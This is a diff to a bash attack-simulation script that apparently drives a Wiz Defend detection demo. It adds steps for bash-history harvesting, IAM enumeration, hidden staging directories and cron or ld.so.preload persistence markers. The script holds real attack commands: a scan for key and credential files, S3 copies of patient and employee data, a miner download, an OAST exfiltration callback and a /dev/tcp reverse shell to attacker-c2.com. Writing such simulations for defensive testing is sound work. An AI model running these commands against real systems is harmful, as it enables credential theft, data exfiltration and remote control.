@@ -31,7 +31,7 @@ fi
 
 SLEEP_TIME=2  # Brief pause between attacks for visibility
 PAYLOAD_FILE="/tmp/exploit-payload-$$.bin"
-TOTAL_ATTACKS=12
+TOTAL_ATTACKS=17
 
 # Banner
 echo -e "${RED}"
@@ -160,12 +160,27 @@ run_attack "6" "📁" "Filesystem Secret Scanning" \
     "Sensitive File Access" \
     'find /root /home /etc /opt -type f -name "*.env" -o -name "*.pem" -o -name "*.key" -o -name "config.json" -o -name "credentials" 2>/dev/null | head -20 > /tmp/secret-files.txt || echo "SCAN_COMPLETE" > /tmp/secret-files.txt'
 
-run_attack "7" "🪣" "S3 Bucket Discovery" \
+run_attack "7" "📜" "Bash History Harvesting" \
+    "Reads bash history files to discover previously executed commands and secrets" \
+    "Credential Harvesting" \
+    'cat /root/.bash_history /home/*/.bash_history 2>/dev/null | head -100 > /tmp/bash-history.txt || echo "HISTORY_SCAN_COMPLETE" > /tmp/bash-history.txt'
+
+run_attack "8" "👻" "Hidden Directory Creation" \
+    "Creates hidden staging directory in /dev/shm for malware staging" \
+    "Suspicious File Activity" \
+    'mkdir -p /dev/shm/.../...HIDDEN.../ 2>/dev/null && echo "STAGING_READY" > /dev/shm/.../...HIDDEN.../marker.txt'
+
+run_attack "9" "🪣" "S3 Bucket Discovery" \
     "Uses stolen IAM credentials to list accessible S3 buckets" \
     "Cloud API Enumeration" \
     'aws s3 ls > /tmp/s3-buckets.txt 2>&1'
 
-run_attack "8" "📂" "S3 Sensitive Data Access" \
+run_attack "10" "👤" "AWS IAM Enumeration" \
+    "Enumerates IAM roles and policies to identify privilege escalation paths" \
+    "Cloud API Enumeration" \
+    'aws iam list-roles --max-items 10 > /tmp/iam-roles.txt 2>&1 || echo "IAM_ENUM_ATTEMPTED" > /tmp/iam-roles.txt'
+
+run_attack "11" "📂" "S3 Sensitive Data Access" \
     "Accesses S3 bucket containing sensitive data" \
     "Cloud Data Access" \
     'aws s3 ls s3://wiz-demo-sensitive-data-wiz-e624d66e/ --recursive > /tmp/s3-sensitive.txt 2>&1'
@@ -177,29 +192,39 @@ run_attack "8" "📂" "S3 Sensitive Data Access" \
 echo -e "${PURPLE}▶ PHASE 4: Data Exfiltration & Persistence${NC}"
 echo ""
 
-run_attack "9" "📤" "Data Exfiltration" \
+run_attack "12" "📤" "Data Exfiltration" \
     "Downloads PII, medical records, and API keys from S3" \
     "Data Exfiltration" \
     'aws s3 cp s3://wiz-demo-sensitive-data-wiz-e624d66e/employees.json /tmp/exfil-employees.json 2>&1 && aws s3 cp s3://wiz-demo-sensitive-data-wiz-e624d66e/healthcare/patient_records.json /tmp/exfil-medical.json 2>&1'
 
-run_attack "10" "⛏️" "Cryptominer Download Attempt" \
+run_attack "13" "⏰" "Cron Persistence" \
+    "Creates @reboot cron job to maintain persistence across reboots" \
+    "Persistence Mechanism" \
+    'echo "@reboot /tmp/backdoor.sh" > /tmp/malicious-cron.txt 2>/dev/null && echo "CRON_PERSISTENCE_STAGED" >> /tmp/malicious-cron.txt'
+
+run_attack "14" "🦠" "ld.so.preload Manipulation" \
+    "Attempts rootkit-style library preload hijacking" \
+    "Rootkit Activity" \
+    'echo "/tmp/malicious.so" > /tmp/ld-preload-test.txt 2>/dev/null && echo "LD_PRELOAD_STAGED" >> /tmp/ld-preload-test.txt'
+
+run_attack "15" "⛏️" "Cryptominer Download Attempt" \
     "Attempts to download cryptocurrency miner from GitHub" \
     "Cryptominer Activity" \
     'curl -s -o /tmp/xmrig https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz --connect-timeout 3 2>/dev/null || echo "MINER_DOWNLOAD_ATTEMPT" > /tmp/miner-marker.txt'
 
-run_attack "11" "📡" "OAST Exfiltration Beacon" \
+run_attack "16" "📡" "OAST Exfiltration Beacon" \
     "Exfiltrates data via HTTP callback to attacker-controlled OAST domain" \
     "Data Exfiltration / C2 Callback" \
     'curl -s http://script-oast-test.aezukuqsjqlaoghyjmiw9mg769uqgs4gb.oast.fun/exfil --connect-timeout 3'
 
 # ═══════════════════════════════════════════════════════════════
-# PHASE 5: Reverse Shell
+# PHASE 5: Reverse Shell & Anti-Forensics
 # ═══════════════════════════════════════════════════════════════
 
-echo -e "${PURPLE}▶ PHASE 5: Reverse Shell${NC}"
+echo -e "${PURPLE}▶ PHASE 5: Reverse Shell & Anti-Forensics${NC}"
 echo ""
 
-run_attack "12" "🚨" "Reverse Shell Attempt" \
+run_attack "17" "🚨" "Reverse Shell Attempt" \
     "Attempts to establish interactive shell to attacker C2 server" \
     "Reverse Shell / C2 Communication" \
     'bash -c "/bin/bash -i > /dev/tcp/attacker-c2.com/4444 0<&1 2>&1" 2>/dev/null || echo "REVERSE_SHELL_ATTEMPTED" > /tmp/revshell-marker.txt'
@@ -227,23 +252,33 @@ echo -e "      • 🌍 Credential Harvesting"
 echo ""
 echo -e "    ${GREEN}Phase 3:${NC} Discovery & Lateral Movement"
 echo -e "      • 📁 Sensitive File Access"
-echo -e "      • 🪣 Cloud API Enumeration"
+echo -e "      • 📜 Bash History Harvesting"
+echo -e "      • 👻 Hidden Directory Creation"
+echo -e "      • 🪣 Cloud API Enumeration (S3)"
+echo -e "      • 👤 Cloud API Enumeration (IAM)"
 echo -e "      • 📂 Cloud Data Access"
 echo ""
 echo -e "    ${GREEN}Phase 4:${NC} Exfiltration & Persistence"
 echo -e "      • 📤 Data Exfiltration"
+echo -e "      • ⏰ Persistence Mechanism (Cron)"
+echo -e "      • 🦠 Rootkit Activity (ld.so.preload)"
 echo -e "      • ⛏️  Cryptominer Activity"
-echo -e "      • 📡 DNS Exfiltration"
+echo -e "      • 📡 C2 Callback / OAST"
 echo ""
-echo -e "    ${GREEN}Phase 5:${NC} Reverse Shell"
+echo -e "    ${GREEN}Phase 5:${NC} Reverse Shell & Anti-Forensics"
 echo -e "      • 🚨 Reverse Shell / C2 Communication"
 echo ""
 echo -e "${CYAN}Artifacts created on target:${NC}"
-echo -e "    /tmp/banner.json        - RCE proof (triggers PWNED UI)"
-echo -e "    /tmp/imds-creds.json    - Stolen AWS credentials"
-echo -e "    /tmp/s3-sensitive.txt   - S3 bucket listing"
-echo -e "    /tmp/exfil-*.json       - Exfiltrated data"
-echo -e "    /tmp/revshell-marker.txt - Reverse shell marker"
+echo -e "    /tmp/banner.json           - RCE proof (triggers PWNED UI)"
+echo -e "    /tmp/imds-creds.json       - Stolen AWS credentials"
+echo -e "    /tmp/bash-history.txt      - Harvested bash history"
+echo -e "    /dev/shm/.../...HIDDEN.../ - Hidden staging directory"
+echo -e "    /tmp/iam-roles.txt         - IAM enumeration results"
+echo -e "    /tmp/s3-sensitive.txt      - S3 bucket listing"
+echo -e "    /tmp/exfil-*.json          - Exfiltrated data"
+echo -e "    /tmp/malicious-cron.txt    - Cron persistence marker"
+echo -e "    /tmp/ld-preload-test.txt   - ld.so.preload marker"
+echo -e "    /tmp/revshell-marker.txt   - Reverse shell marker"
 echo ""
 echo -e "${YELLOW}📊 Open Wiz Defend console to view the attack timeline${NC}"
 echo ""
